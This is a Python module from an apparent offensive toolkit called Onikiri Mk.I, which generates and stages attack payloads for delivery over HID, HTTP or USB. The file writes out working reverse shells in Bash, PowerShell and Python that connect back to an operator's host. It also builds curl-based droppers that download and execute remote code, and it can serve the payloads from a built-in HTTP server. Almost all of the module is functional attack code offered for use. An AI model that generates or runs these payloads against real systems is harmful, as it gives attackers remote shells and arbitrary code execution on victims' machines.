"""
Onikiri Mk.I — Payload Builder Module
Generates and stages deployment payloads (scripts, droppers).
Outputs to /userdata/captures/payloads/ for delivery via HID, HTTP server, or USB mass storage.
"""

from __future__ import annotations

import hashlib
import json
import os
import time
from pathlib import Path
from typing import Any

from .base_module import BaseModule, ModuleState

_PAYLOAD_DIR = Path("/userdata/captures/payloads")


class PayloadBuilderModule(BaseModule):
    name = "payload_builder"
    description = "Payload generation: reverse shells, droppers, persistence stubs"
    commands = {
        "list":             "List staged payloads",
        "build_reverse_sh": "Generate a Bash reverse shell script",
        "build_reverse_ps": "Generate a PowerShell reverse shell script",
        "build_dropper":    "Generate a wget/curl dropper stub",
        "build_python_rev": "Generate a Python reverse shell one-liner",
        "serve":            "Start a one-shot HTTP server to deliver a payload",
        "delete":           "Remove a staged payload",
        "wipe_all":         "Remove all staged payloads",
    }

    async def register(self) -> None:
        _PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
        self.state = ModuleState.IDLE

    async def execute(self, command: str, params: dict) -> Any:
        handlers = {
            "list":             self._list,
            "build_reverse_sh": self._build_reverse_sh,
            "build_reverse_ps": self._build_reverse_ps,
            "build_dropper":    self._build_dropper,
            "build_python_rev": self._build_python_rev,
            "serve":            self._serve,
            "delete":           self._delete,
            "wipe_all":         self._wipe_all,
        }
        handler = handlers.get(command)
        if handler is None:
            raise ValueError(f"unknown command: {command}")
        return await handler(params)

    # ── Commands ──────────────────────────────────────────────────────────────

    async def _list(self, _params: dict) -> dict:
        payloads = []
        for p in sorted(_PAYLOAD_DIR.iterdir()):
            if p.is_file():
                payloads.append({
                    "name": p.name,
                    "size": p.stat().st_size,
                    "sha256": hashlib.sha256(p.read_bytes()).hexdigest()[:16],
                })
        return {"payloads": payloads}

    async def _build_reverse_sh(self, params: dict) -> dict:
        self._require(params, "lhost", "lport")
        lhost = self._sanitise_ip(params["lhost"])
        lport = self._sanitise_port(params["lport"])
        name = params.get("name", f"rev_{lhost}_{lport}.sh")
        name = self._sanitise_filename(name)

        content = (
            "#!/bin/bash\n"
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"
        )
        return self._stage(name, content, "sh")

    async def _build_reverse_ps(self, params: dict) -> dict:
        self._require(params, "lhost", "lport")
        lhost = self._sanitise_ip(params["lhost"])
        lport = self._sanitise_port(params["lport"])
        name = params.get("name", f"rev_{lhost}_{lport}.ps1")
        name = self._sanitise_filename(name)

        content = (
            "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{{0}};"
            "while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $d 2>&1|Out-String);"
            "$e=([text.encoding]::ASCII).GetBytes($r);"
            "$s.Write($e,0,$e.Length)}}"
        ).format(lhost=lhost, lport=lport)
        return self._stage(name, content, "ps1")

    async def _build_dropper(self, params: dict) -> dict:
        self._require(params, "url")
        url = params["url"]
        # Validate URL scheme (http/https only)
        if not (url.startswith("http://") or url.startswith("https://")):
            raise ValueError("url must use http:// or https://")
        name = params.get("name", "dropper.sh")
        name = self._sanitise_filename(name)
        exec_flag = "--exec" in params.get("flags", [])

        if exec_flag:
            content = f"#!/bin/sh\ncurl -fsSL '{url}' | sh\n"
        else:
            content = (
                f"#!/bin/sh\n"
                f"curl -fsSL -o /tmp/p '{url}'\n"
                f"chmod +x /tmp/p && /tmp/p\n"
            )
        return self._stage(name, content, "sh")

    async def _build_python_rev(self, params: dict) -> dict:
        self._require(params, "lhost", "lport")
        lhost = self._sanitise_ip(params["lhost"])
        lport = self._sanitise_port(params["lport"])
        name = params.get("name", f"rev_{lhost}_{lport}.py")
        name = self._sanitise_filename(name)

        content = (
            "import socket,subprocess,os\n"
            f"s=socket.socket()\n"
            f"s.connect(('{lhost}',{lport}))\n"
            "os.dup2(s.fileno(),0)\n"
            "os.dup2(s.fileno(),1)\n"
            "os.dup2(s.fileno(),2)\n"
            "subprocess.call(['/bin/sh','-i'])\n"
        )
        return self._stage(name, content, "py")

    async def _serve(self, params: dict) -> dict:
        self._require(params, "filename")
        filename = self._sanitise_filename(params["filename"])
        path = _PAYLOAD_DIR / filename
        if not path.exists():
            raise FileNotFoundError(f"payload not found: {filename}")
        port = self._sanitise_port(params.get("port", 8888))

        result = await self._run_subprocess(
            ["python3", "-m", "http.server", str(port),
             "--directory", str(_PAYLOAD_DIR)],
            timeout=30.0,
        )
        return {"port": port, "file": filename}

    async def _delete(self, params: dict) -> dict:
        self._require(params, "filename")
        filename = self._sanitise_filename(params["filename"])
        path = _PAYLOAD_DIR / filename
        if path.exists():
            path.unlink()
            return {"deleted": filename}
        return {"error": "not found"}

    async def _wipe_all(self, _params: dict) -> dict:
        count = 0
        for p in _PAYLOAD_DIR.iterdir():
            if p.is_file():
                p.unlink()
                count += 1
        return {"wiped": count, "timestamp": time.time()}

    # ── Helpers ───────────────────────────────────────────────────────────────

    @staticmethod
    def _stage(name: str, content: str, ext: str) -> dict:
        _PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)
        if not name.endswith(f".{ext}"):
            name = f"{name}.{ext}"
        path = _PAYLOAD_DIR / name
        path.write_text(content)
        os.chmod(path, 0o700)
        return {
            "name": name,
            "path": str(path),
            "size": len(content),
            "sha256": hashlib.sha256(content.encode()).hexdigest(),
        }

    @staticmethod
    def _sanitise_ip(ip: str) -> str:
        import ipaddress
        return str(ipaddress.ip_address(ip.strip()))

    @staticmethod
    def _sanitise_port(port: object) -> int:
        p = int(port)
        if not (1 <= p <= 65535):
            raise ValueError(f"invalid port: {p}")
        return p

    @staticmethod
    def _sanitise_filename(name: str) -> str:
        import re
        clean = re.sub(r"[^a-zA-Z0-9._\-]", "_", name)
        if ".." in clean or clean.startswith("/"):
            raise ValueError(f"invalid filename: {name!r}")
        return clean
